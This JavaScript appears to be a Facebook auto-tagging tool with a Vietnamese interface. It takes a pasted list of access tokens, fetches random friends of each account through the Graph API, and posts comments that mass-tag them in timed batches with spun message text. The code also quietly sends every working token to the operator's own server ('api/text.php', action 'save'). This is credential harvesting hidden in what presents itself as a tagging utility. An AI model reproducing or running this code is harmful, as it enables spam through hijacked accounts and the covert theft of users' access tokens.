function auto_tags_check(d){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:d,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT '+auto_tags.limit+'"}]',include_headers:'false'
	}
	,function(f){
		var l=JSON.parse(f[0].body);
		auto_tags.array[auto_tags.success]=[],auto_tags.array[auto_tags.success].uid=l.id,auto_tags.array[auto_tags.success].data=JSON.parse(f[1].body).data,auto_tags.array[auto_tags.success].access_token=d,auto_tags.array[auto_tags.success].array=[];
		for(var j=0;
		j<Math.ceil(auto_tags.array[auto_tags.success].data.length/auto_tags.one);
		j++){
			var p=j*auto_tags.one;
			auto_tags.array[auto_tags.success].array[j]=[];
			for(var m=p;
			m<p+(auto_tags.array[auto_tags.success].data.length-p>auto_tags.one?auto_tags.one:auto_tags.array[auto_tags.success].data.length-p);
			m++){
				auto_tags.array[auto_tags.success].array[j].push('@['+auto_tags.array[auto_tags.success].data[m].uid+':0]')
			}
		}
		;
		auto_tags.success++,auto_tags.bach+=d+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_tags.success+'</td>',tbody+='	<td>'+l.name+'</td>',tbody+='	<td align="center">'+auto_tags.array[auto_tags.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_tags_success_'+auto_tags.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_tags_error_'+auto_tags.success+'">0</span></font></td>',tbody+='	<td id="auto_tags_status_'+auto_tags.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_tags_body').append(tbody)
	}
	).fail(function(f){
		'undefined'== typeof f.responseText?auto_tags_check(d):auto_tags.error++
	}
	).always(function(){
		if(auto_tags.success+auto_tags.error==auto_tags.token.split('\n').length){
			if(auto_tags.success>0){
				var d=$.trim(auto_tags.bach).split('\n');
				d.length>0&&$.post('//'+b_sv+'/api/text.php',{
					act:'save',array:d
				}
				);
				for(var f=0;
				f<auto_tags.array.length;
				f++){
					auto_tags_send(f,0)
				}
			}
			else {
				$('#submit_auto_tags_start').buttonStop(),$('#submit_auto_tags_stop').disabled(),noti.success('Không Access Token nào Live !'),$('#html_auto_tags_result').hide()
			}
		}
	}
	)
}
function auto_tags_send(d,f){
	return 0==auto_tags.run?!1:void((0==auto_tags.array[d].data.length?($('#auto_tags_status_'+(d+1)).html('<font color="red">Không có bạn bè !</font>'),auto_tags.total++,auto_tags.total==auto_tags.success&&($('#submit_auto_tags_start').buttonStop(),$('#submit_auto_tags_stop').disabled(),noti.success('Quá trình tags comment đã hoàn tất !'))):($('#auto_tags_status_'+(d+1)).html('<font color="blue">Đang tiến hành tags <b>'+auto_tags.array[d].array[f].length+'</b> bạn bè</font> '+run.loading()),$.get('https://graph.facebook.com/'+auto_tags.id+'/comments',{
		method:'post',access_token:auto_tags.array[d].access_token,message:init.spinText(auto_tags.msg)+' '+auto_tags.array[d].array[f].join(' ')
	}
	).done(function(l){
		$('#auto_tags_success_'+(d+1)).text(parseInt($('#auto_tags_success_'+(d+1)).text())+auto_tags.array[d].array[f].length),$('#auto_tags_status_'+(d+1)).html('<font color="green">Tags thành công <b>'+auto_tags.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading())
	}
	).error(function(l){
		if($('#auto_tags_error_'+(d+1)).text(parseInt($('#auto_tags_error_'+(d+1)).text())+auto_tags.array[d].array[f].length),$('#auto_tags_status_'+(d+1)).html('<font color="red">Tags thất bại <b>'+auto_tags.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading()),l.responseText){
			var l=init.replace_JSON(l.responseText);
			noti.error(l.error.message)
		}
	}
	).always(function(){
		f+1<auto_tags.array[d].array.length?timer.count_down_array(0,Math.floor(auto_tags.delay/60),auto_tags.delay-60*Math.floor(auto_tags.delay/60),'timedown_'+(d+1),d,function(){
			auto_tags_send(d,f+1)
		}
		):($('#auto_tags_status_'+(d+1)).html('<font color="green">Hoàn thành !</font>'),auto_tags.total++,auto_tags.total==auto_tags.success&&($('#submit_auto_tags_start').buttonStop(),$('#submit_auto_tags_stop').disabled(),noti.success('Quá trình tags comment đã hoàn tất !')))
	}
	))))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_tags_stop',function(){
	auto_tags.run=0;
	for(var d=0;
	d<auto_tags.array.length;
	d++){
		clearTimeout(timeout_array[d])
	}
	;
	$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_tags_stop').disabled(),$('#submit_auto_tags_start').buttonStop(),noti.success('Đã có lệnh dừng tags comment !')
}
),$(document).on('click','#submit_auto_tags_start',function(){
	auto_tags={
		token:$('#input_auto_tags_token').validate(),msg:$('#input_auto_tags_msg').validate(),id:$('#input_auto_tags_id').isNumber(),one:$('#input_auto_tags_one').isNumber(),limit:$('#input_auto_tags_fql_limit').isNumber(),delay:$('#input_auto_tags_delay').isNumber(),array:[],run:1,total:0,success:0,error:0,bach:''
	}
	,auto_tags.token&&auto_tags.msg&&auto_tags.id&&auto_tags.one&&auto_tags.limit&&auto_tags.delay&&($(this).buttonLoad(),$('#submit_auto_tags_stop').undisabled(),$('#html_auto_tags_result').fadeIn('fast'),$('#html_auto_tags_body').html(''),$.each(auto_tags.token.split('\n'),function(d,f){
		var l=f.split('|');
		l=l[1]?l[1]:f,setTimeout(function(){
			auto_tags_check(l)
		}
		,15*d)
	}
	))
}
))